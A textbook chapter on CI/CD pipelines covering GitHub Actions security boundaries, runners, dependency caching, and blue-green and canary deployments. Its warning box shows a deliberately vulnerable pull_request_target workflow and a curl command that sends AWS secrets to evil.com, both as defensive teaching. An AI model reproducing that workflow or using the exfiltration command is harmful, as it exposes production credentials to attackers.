\chapter{CI/CD Pipelines}
\label{ch:cicd-pipelines}

\begin{chaptergoalsbox}
\textbf{What You Will Learn:}
\begin{itemize}[leftmargin=12pt]
  \item GitHub Actions execution models, webhook triggers, matrix builds, path filtering, and concurrency groups.
  \item Security boundaries between \texttt{pull\_request} and \texttt{pull\_request\_target}, and defending against runner poisoning.
  \item Runner architectures: GitHub-hosted ephemeral VMs versus Kubernetes-native self-hosted Actions Runner Controller (ARC).
  \item Build acceleration and dependency caching mathematics: cache keys, restore key fallbacks, cache eviction algorithms, and cache poisoning mitigation.
  \item Blue-Green deployment architecture: zero-downtime cutover via reverse proxies, cloud load balancers, and Kubernetes Service selectors.
  \item Canary rollouts and progressive delivery: traffic splitting, statistical SLI analysis, and automated Prometheus-gated rollbacks using Argo Rollouts.
\end{itemize}

\textbf{What You Should Already Understand:}
\begin{itemize}[leftmargin=12pt]
  \item Git version control workflows: branches, pull requests, commit hashes, and semantic tags.
  \item Basic HTTP routing, DNS records, and layer-7 reverse proxying.
  \item Container orchestration and Kubernetes Deployments (covered in Chapter~\ref{ch:docker-kubernetes}).
\end{itemize}

\textbf{Why This Topic Exists:}
Continuous Integration and Continuous Deployment (CI/CD) is the central nervous system of modern software engineering. An insecure, sluggish, or brittle CI/CD pipeline bottlenecks engineering velocity, leaks production secrets, and risks severe production downtime during faulty deployments. Mastering deployment strategies and pipeline engineering transforms code release into a safe, deterministic, automated science.

\textbf{Motivating Practical Problem:}
A high-velocity SaaS organization pushes 80 production deployments per day. Recently, a critical database migration failure deployed directly to all users simultaneously, causing a 45-minute total system outage. Concurrently, an open-source contributor submitted a pull request with an altered build script that extracted the company's AWS production secret keys from the pipeline environment. How do you re-architect the CI/CD pipeline to strictly secure pull request boundaries, optimize build caching, and enforce automated canary deployments with real-time SLI rollback gates?
\end{chaptergoalsbox}

\section{Workflow Triggers and Event Models}

In modern CI/CD systems like GitHub Actions, workflows are event-driven directed acyclic graphs executed in response to specific repository events.

\subsection{Trigger Categories and Webhook Delivery}
Workflows execute based on three primary trigger classes:
\begin{enumerate}[leftmargin=15pt]
  \item \textbf{Code Events:} \texttt{push}, \texttt{pull\_request}, \texttt{create} (tags/branches), \texttt{delete}.
  \item \textbf{Manual \& External Events:} \texttt{workflow\_dispatch} (manual UI trigger with typed input parameters) and \texttt{repository\_dispatch} (arbitrary external webhook payloads).
  \item \textbf{Temporal Events:} \texttt{schedule} (POSIX cron syntax evaluated by GitHub's scheduler).
\end{enumerate}

\subsection{Security Boundaries: \texttt{pull\_request} vs. \texttt{pull\_request\_target}}
A critical vulnerability in enterprise CI/CD systems stems from misunderstanding pull request event contexts:
\begin{itemize}[leftmargin=12pt]
  \item \textbf{\texttt{on: pull\_request}:} The workflow runs in the context of the \textbf{merge commit} between the pull request branch and the target branch. Crucially, GitHub executes this runner in a restricted sandbox: \textbf{secrets are stripped}, and the default \texttt{GITHUB\_TOKEN} has read-only permissions. If an external untrusted contributor alters the workflow file or build scripts, they cannot exfiltrate secrets because no secrets exist in the runner memory space.
  \item \textbf{\texttt{on: pull\_request\_target}:} The workflow runs in the context of the \textbf{base (target) repository's default branch}. This event grants full access to repository secrets and write tokens. 
\end{itemize}

\begin{productionwarningbox}[The Dangerous ``PwnRequest'' Anti-Pattern]
Never combine \texttt{on: pull\_request\_target} with an explicit checkout of the untrusted PR head commit:
\begin{lstlisting}[language=bash]
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # FATAL VULNERABILITY!
      - run: npm install && npm test # Runs attacker code with access to production secrets!
\end{lstlisting}
An external attacker can submit a PR that alters \texttt{package.json} to execute \texttt{curl https://evil.com/\$AWS\_SECRET\_ACCESS\_KEY} in a pre-install hook, stealing your secrets.
\end{productionwarningbox}

\subsection{Concurrency Groups and Race Condition Prevention}
When multiple developers push commits rapidly to the same branch, parallel workflow runs waste compute minutes and can trigger deployment race conditions (e.g., an older commit finishing deployment \emph{after} a newer commit). GitHub Actions addresses this via \textbf{concurrency groups}:
\begin{lstlisting}[language=bash, caption={Concurrency Control in GitHub Actions}]
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
\end{lstlisting}
When a new push occurs on a branch, any currently active build for that specific branch is immediately canceled, saving runner capacity and guaranteeing that only the latest commit deploys to staging.

\section{Runner Architecture and Security Boundaries}

The runner is the execution host that runs the individual steps declared in a workflow job.

\subsection{GitHub-Hosted vs. Self-Hosted Runners}
\begin{table}[htbp]
\centering\small
\begin{tabular}{lp{6.2cm}p{6.2cm}}
\toprule
\textbf{Dimension} & \textbf{GitHub-Hosted Runners} & \textbf{Self-Hosted Runners (ARC)} \\
\midrule
\textbf{Lifecycle} & Purely ephemeral. A fresh Azure VM is provisioned per job and destroyed immediately on completion. & Can be persistent or ephemeral (using the Actions Runner Controller on Kubernetes). \\
\textbf{Security Perimeter} & Zero data persistence between jobs. Completely isolated disk and memory. & If persistent, compromised jobs can leave backdoors, modify root binaries, or steal credentials. \\
\textbf{Network Access} & Reaches public internet; cannot access internal private corporate VNets without complex VPNs. & Deployed inside private corporate subnets, directly accessing internal databases and registries. \\
\textbf{Cost Model} & Per-minute billing based on CPU/OS tier. & Compute infrastructure costs borne by the organization's cloud cluster. \\
\bottomrule
\end{tabular}
\caption{Comparison: GitHub-Hosted vs. Self-Hosted Runners}
\label{tab:runner-types}
\end{table}

\begin{figure}[htbp]
\centering
\begin{tikzpicture}[
  node distance=0.8cm and 1.0cm,
  gh/.style={rectangle, draw=headingblue, fill=headingblue!5, rounded corners=2pt, text width=4.0cm, minimum height=1.0cm, align=center, font=\sffamily\scriptsize\bfseries},
  k8s/.style={rectangle, draw=exampleBlue, fill=exampleBg, rounded corners=2pt, text width=4.2cm, minimum height=1.0cm, align=center, font=\sffamily\scriptsize\bfseries},
  pod/.style={rectangle, draw=intuitionTeal, fill=intuitionBg, rounded corners=2pt, text width=3.8cm, minimum height=0.8cm, align=center, font=\sffamily\tiny},
  arrow/.style={-{Stealth[scale=0.9]}, thick, color=headingblue}
]

\node[gh] (gh) {GitHub Actions API\\Job Dispatch Queue};
\node[k8s, right=1.6cm of gh] (arc) {Actions Runner Controller\\(Kubernetes Operator)};
\node[pod, below=0.6cm of arc] (p1) {Ephemeral Runner Pod 1\\(Isolated Namespace)};
\node[pod, below=0.3cm of p1] (p2) {Ephemeral Runner Pod 2\\(Isolated Namespace)};

\draw[arrow] (gh) -- node[above, font=\tiny\sffamily]{Long Poll / Webhook} (arc);
\draw[arrow] (arc) -- (p1);
\draw[arrow] (arc) -- (p2);

\end{tikzpicture}
\caption{Kubernetes Actions Runner Controller (ARC) Ephemeral Architecture}
\label{fig:arc-runners}
\end{figure}

\section{Dependency Caching and Optimization}

In standard software builds, downloading external dependencies (e.g., \texttt{node\_modules}, Maven packages, Go modules) consumes 60--80\% of total pipeline duration. \textbf{\texttt{actions/cache}} restores these artifacts between runs.

\subsection{Cache Key Mathematics and Fallback Trees}
A cache entry is identified by an explicit key string. To ensure deterministic cache invalidation, cache keys combine the operating system, package ecosystem, and a cryptographic hash of the lockfile:
\begin{lstlisting}[language=bash]
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-node-
\end{lstlisting}

When this step executes:
\begin{enumerate}[leftmargin=15pt]
  \item The runner computes \texttt{SHA-256} across all \texttt{package-lock.json} files in the repository.
  \item If an exact match is found in the cache storage backend, the tarball is downloaded and unpacked into \texttt{\textasciitilde{}/.npm} (\textbf{Cache Hit}).
  \item If the lockfile changed, the exact key misses. The runner falls back to \textbf{\texttt{restore-keys}}, finding the most recent cache entry matching the prefix \texttt{\${{ runner.os }}-node-} (\textbf{Partial Cache Hit}). The package manager downloads only the newly added delta dependencies, saving substantial time.
\end{enumerate}

\subsection{Cache Eviction and Limits}
GitHub Actions enforces a hard limit of \textbf{10 GB per repository}. When the limit is reached, the caching service evicts entries using a \textbf{Least Recently Used (LRU)} algorithm. Furthermore, any cache entry not accessed for \textbf{7 consecutive days} is automatically purged.

\section{Modern Deployment Strategies: Blue-Green Deployments}

Deploying software directly over running instances (in-place replacement) introduces unavoidable downtime and high failure risk during database migration mismatches or application startup delays.

\subsection{Architecture and Traffic Switching}
\textbf{Blue-Green deployment} maintains two identical production environments:
\begin{itemize}[leftmargin=12pt]
  \item \textbf{Blue Environment (Active):} Currently serves 100\% of live production user traffic.
  \item \textbf{Green Environment (Idle / Staging):} Hosts the newly deployed release candidate.
\end{itemize}

\begin{figure}[htbp]
\centering
\begin{tikzpicture}[
  scale=0.9, every node/.style={scale=0.9},
  node distance=1.1cm and 1.2cm,
  lb/.style={rectangle, draw=headingblue, fill=headingblue!10, rounded corners=2pt, text width=3.8cm, minimum height=1.0cm, align=center, font=\sffamily\scriptsize\bfseries},
  env/.style={rectangle, draw=exampleBlue, fill=exampleBg, rounded corners=2pt, text width=3.4cm, minimum height=1.1cm, align=center, font=\sffamily\scriptsize\bfseries},
  env_idle/.style={rectangle, draw=gray!60, fill=gray!10, rounded corners=2pt, text width=3.4cm, minimum height=1.1cm, align=center, font=\sffamily\scriptsize\bfseries},
  arrow/.style={-{Stealth[scale=0.9]}, thick, color=headingblue}
]

\node[lb] (lb) {Reverse Proxy / Ingress\\(e.g., Azure App Gateway /\\Kubernetes Service)};
\node[env, above right=0.2cm and 1.4cm of lb] (blue) {Blue Cluster (Active)\\Running Release v1.4\\(100\% Production Traffic)};
\node[env_idle, below right=0.2cm and 1.4cm of lb] (green) {Green Cluster (Idle)\\Running Release v1.5\\(Smoke Tests Passing)};

\draw[arrow, thick, color=headingblue] (lb) -- node[above, font=\tiny\sffamily]{Live Traffic} (blue);
\draw[arrow, dashed, color=gray!60] (lb) -- node[below, font=\tiny\sffamily]{Cutover Target} (green);

\end{tikzpicture}
\caption{Blue-Green Deployment Traffic Switching via Ingress Routing}
\label{fig:blue-green}
\end{figure}

The deployment lifecycle follows four deterministic phases:
\begin{enumerate}[leftmargin=15pt]
  \item \textbf{Deploy to Green:} The new version is deployed to the inactive Green environment without affecting production traffic.
  \item \textbf{Automated Smoke Testing:} Integration tests, synthetic transactions, and health checks execute directly against Green.
  \item \textbf{Atomic Traffic Cutover:} The routing layer (e.g., updating an Azure Application Gateway backend pool or altering a Kubernetes Service's \texttt{selector} label) shifts 100\% of live traffic from Blue to Green instantaneously.
  \item \textbf{Instant Rollback Guarantee:} If catastrophic anomalies appear post-cutover, rolling back requires simply toggling the router pointer back to Blue in less than 500 milliseconds.
\end{enumerate}

\section{Canary Rollouts and Progressive Delivery}

While Blue-Green eliminates downtime, shifting 100\% of traffic instantaneously still exposes all users to undiscovered runtime regressions (e.g., memory leaks, database connection pool exhaustion). \textbf{Canary rollouts} mitigate this risk through incremental, data-driven exposure.

\subsection{Stepwise Traffic Shifting Mechanics}
A Canary deployment routes a tiny fraction of live user requests to the new release candidate while the overwhelming majority continues hitting the baseline stable release.

\begin{figure}[htbp]
\centering
\begin{tikzpicture}[
  node distance=0.8cm,
  stepbox/.style={rectangle, draw=headingblue, fill=headingblue!5, rounded corners=2pt, text width=10.0cm, minimum height=0.75cm, align=left, inner sep=6pt, font=\sffamily\footnotesize},
  arrow/.style={-{Stealth[scale=0.9]}, thick, color=headingblue}
]

\node[stepbox] (s1) {\textbf{Phase 1 (2\% Traffic):} Route 2\% of incoming traffic to Canary. Run Prometheus analysis for 10 minutes.};
\node[stepbox, below=0.5cm of s1] (s2) {\textbf{Phase 2 (10\% Traffic):} If error rate $< 0.1\%$ and P99 latency $< 150\text{ms}$, ramp to 10\%.};
\node[stepbox, below=0.5cm of s2] (s3) {\textbf{Phase 3 (50\% Traffic):} Verify database connection saturation and CPU limits under sustained load.};
\node[stepbox, below=0.5cm of s3] (s4) {\textbf{Phase 4 (100\% Promotion):} Promote Canary to baseline stable version. Decommission old pods.};

\draw[arrow] (s1) -- (s2);
\draw[arrow] (s2) -- (s3);
\draw[arrow] (s3) -- (s4);

\end{tikzpicture}
\caption{Canary Progressive Delivery Traffic Ramp Workflow}
\label{fig:canary-ramp}
\end{figure}

\subsection{Automated Rollbacks with Argo Rollouts and Prometheus}
Instead of relying on human engineers watching dashboards, Kubernetes-native progressive delivery controllers like \textbf{Argo Rollouts} automate health gating via continuous PromQL analysis:

\begin{lstlisting}[language=bash, caption={Argo Rollouts Canary with Automated Prometheus Analysis}]
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: payment-api-rollout
spec:
  replicas: 20
  strategy:
    canary:
      analysis:
        templates:
        - templateName: success-rate-check
        args:
        - name: service-name
          value: payment-api-canary
      steps:
      - setWeight: 5
      - pause: {duration: 10m} # Hold 5% traffic for 10 minutes
      - setWeight: 20
      - pause: {duration: 30m}
      - setWeight: 50
      - pause: {duration: 15m}
---
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata:
  name: success-rate-check
spec:
  metrics:
  - name: success-rate
    interval: 60s
    successCondition: result[0] >= 0.999 # 99.9% Success Rate
    failureLimit: 3 # Abort after 3 consecutive failed checks
    provider:
      prometheus:
        address: http://prometheus-k8s.monitoring:9090
        query: |
          sum(rate(http_requests_total{status!~"5.*",app="payment-api-canary"}[2m]))
          /
          sum(rate(http_requests_total{app="payment-api-canary"}[2m]))
\end{lstlisting}

If the PromQL query evaluates below \texttt{0.999} for three consecutive checks, Argo Rollouts immediately halts the rollout, resets traffic routing to 0\% Canary, and restores 100\% of traffic to stable pods without human intervention.

\begin{realworldbox}[A Multi-Hour DNS Caching Disaster During Blue-Green Cutover]
An enterprise fintech executing a Blue-Green deployment switched traffic between Blue and Green environments by updating the DNS \texttt{A} record of \texttt{api.fintech.com}. The release candidate contained a critical database schema defect. Within 30 seconds of DNS cutover, transaction errors spiked. The platform team immediately reverted the DNS record back to Blue. However, because thousands of corporate ISP recursive resolvers and mobile client operating systems ignored the 60-second DNS TTL and cached the record for 24 hours, corrupted requests continued bombarding the failing Green environment for hours. The company suffered \$1.4M in lost trading fees. The architecture was subsequently overhauled to use Layer-7 reverse proxies (Envoy/ALB) for sub-second cutover and rollback, keeping public DNS records strictly static.
\end{realworldbox}

\begin{tryityourselfbox}[Simulating a Canary Traffic Split with Nginx]
You can test progressive traffic routing locally using Nginx's \texttt{split\_clients} module:
\begin{lstlisting}[language=bash]
# /etc/nginx/nginx.conf
http {
  split_clients "${remote_addr}${http_user_agent}" $backend_pool {
    5%      canary_upstream;
    *       stable_upstream;
  }

  upstream stable_upstream { server 127.0.0.1:8081; }
  upstream canary_upstream { server 127.0.0.1:8082; }

  server {
    listen 80;
    location / {
      proxy_pass http://$backend_pool;
    }
  }
}
\end{lstlisting}
Reloading Nginx config immediately partitions 5\% of unique client sessions to the Canary instance.
\end{tryityourselfbox}

\section{Chapter Summary \& Key Takeaways}
\begin{itemize}[leftmargin=15pt]
  \item \textbf{PR Security:} \texttt{pull\_request} executes in an isolated sandbox with zero access to secrets; \texttt{pull\_request\_target} possesses full secret access and must never checkout untrusted PR code directly.
  \item \textbf{Runner Security:} GitHub-hosted runners are completely ephemeral and isolated; self-hosted runners provide private network access but risk host-poisoning unless managed ephemerally via ARC.
  \item \textbf{Build Caching:} Deterministic cache keys using \texttt{hashFiles} combined with fallback \texttt{restore-keys} dramatically accelerate builds while LRU evicts stale dependencies.
  \item \textbf{Blue-Green Deployments:} Shifts 100\% of live traffic between active (Blue) and idle (Green) environments via layer-7 load balancers, providing zero-downtime cutovers and sub-second rollbacks.
  \item \textbf{Canary Deployments:} Progressively shifts traffic (e.g., 2\% $\to$ 10\% $\to$ 50\% $\to$ 100\%) while evaluating real-time SLIs.
  \item \textbf{Progressive Automation:} Tools like Argo Rollouts query Prometheus continuously, triggering automated aborts and rollbacks if error budgets are breached.
\end{itemize}

\section{Exercises}

\subsection{Mechanics}
\begin{enumerate}[leftmargin=18pt]
  \item A repository utilizes \texttt{actions/cache@v4} with the key \texttt{Linux-go-\$\{hashFiles('go.sum')\}}. The cache contains an entry for hash \texttt{a1b2c3d4}. A developer updates one dependency in \texttt{go.mod}, producing a new hash \texttt{e5f6g7h8}. Detail the exact cache lookup sequence, state whether a hit or miss occurs, and describe what happens at the conclusion of the workflow run.
  \item In an Argo Rollouts configuration, a canary rollout has 20 total replicas. The step sequence specifies \texttt{setWeight: 15}. How many pods run the canary image, and how many continue running the stable image during this step?
\end{enumerate}

\subsection{Debugging}
\begin{enumerate}[leftmargin=18pt]
  \setcounter{enumi}{2}
  \item An organization deploys self-hosted GitHub Actions runners on persistent virtual machines. A developer reports that a build script on the \texttt{main} branch occasionally fails with \texttt{Permission denied: /usr/local/bin/aws}, and debugging reveals that an unauthorized cryptocurrency miner was deposited in \texttt{/tmp}. Explain the exact vulnerability chain that permitted an attacker to compromise the runner and recommend the remediation architecture.
\end{enumerate}

\subsection{Architecture}
\begin{enumerate}[leftmargin=18pt]
  \setcounter{enumi}{3}
  \item Design an enterprise-grade CI/CD pipeline for a multi-tenant payment platform. The pipeline must run linting, unit tests, and security scans on pull requests without exposing secrets. On merge to \texttt{main}, it must build a container image, deploy to a staging cluster, run automated integration tests, and then execute a progressive canary rollout to production across 50 Kubernetes pods, gated by P99 latency and HTTP 5xx error rate PromQL metrics.
\end{enumerate}

\section{Detailed Solutions}
\begin{enumerate}[leftmargin=18pt]
  \item \textbf{Solution (Mechanics):}\\
  The runner calculates the SHA-256 hash of the modified \texttt{go.sum}, yielding \texttt{e5f6g7h8}. It queries the cache backend for key \texttt{Linux-go-e5f6g7h8}. Because only \texttt{Linux-go-a1b2c3d4} exists, an exact cache miss occurs. If no \texttt{restore-keys} are defined, the build starts with an empty cache directory. At the conclusion of the job (post-run step), the action archives the resulting Go dependency cache and uploads it to GitHub cache storage under the new key \texttt{Linux-go-e5f6g7h8}.

  \item \textbf{Solution (Mechanics):}\\
  With \texttt{setWeight: 15} on 20 total replicas:
  \begin{equation*}
  \text{Canary Replicas} = \lceil 20 \times 0.15 \rceil = \lceil 3.0 \rceil = 3 \text{ pods}.
  \end{equation*}
  Stable Replicas = $20 - 3 = 17 \text{ pods}$.

  \item \textbf{Solution (Debugging):}\\
  \textbf{Root Cause:} The repository enabled pull request runs on persistent self-hosted runners. An external contributor submitted a PR containing malicious commands in a test script. Because the runner VM was \textbf{persistent} and not wiped between jobs, the malicious script modified system binaries, placed backdoors in \texttt{/tmp}, and compromised subsequent legitimate builds.\\
  \textbf{Remediation:}
  \begin{itemize}[leftmargin=12pt]
    \item Never run public or untrusted pull requests on self-hosted runners.
    \item Replace persistent runner VMs with the \textbf{Actions Runner Controller (ARC)} on Kubernetes, running ephemeral pods that are completely destroyed and recreated from a clean image after every single job.
  \end{itemize}

  \item \textbf{Solution (Architecture):}\\
  Structure the pipeline in two decoupled workflows:
  \begin{itemize}[leftmargin=12pt]
    \item \textbf{PR Workflow (\texttt{on: pull\_request}):} Runs on GitHub-hosted ephemeral runners. Executes Semgrep SAST, Trivy SCA, linting, and unit tests. Runs with read-only tokens and zero production secrets.
    \item \textbf{Release Workflow (\texttt{on: push} to \texttt{main}):} Authenticates to cloud container registry using OIDC Workload Identity (no static API keys). Builds and signs the container image using Cosign. Deploys to Staging.
    \item \textbf{Production Canary:} Updates the Argo Rollouts custom resource targeting the production cluster. Argo Rollouts splits traffic: 5\% for 15 minutes, 20\% for 30 minutes, 50\% for 15 minutes, then 100\%. Continuous \texttt{AnalysisTemplate} queries Prometheus: aborts immediately if error rate exceeds 0.1\% or P99 latency exceeds 200ms.
  \end{itemize}
\end{enumerate}

\section{Further Reading \& Citations}
\begin{itemize}[leftmargin=15pt]
  \item Humble, J., and Farley, D. \emph{Continuous Delivery: Reliable Software Releases through Build, Test, and Deployment Automation}. Addison-Wesley, 2010.
  \item GitHub Documentation. \emph{Security Hardening for GitHub Actions}, \texttt{docs.github.com}, 2025.
  \item Argo Project. \emph{Argo Rollouts: Progressive Delivery for Kubernetes}, Cloud Native Computing Foundation (CNCF).
  \item Kim, G., Humble, J., Debois, P., and Willis, J. \emph{The DevOps Handbook}. IT Revolution Press.
\end{itemize}
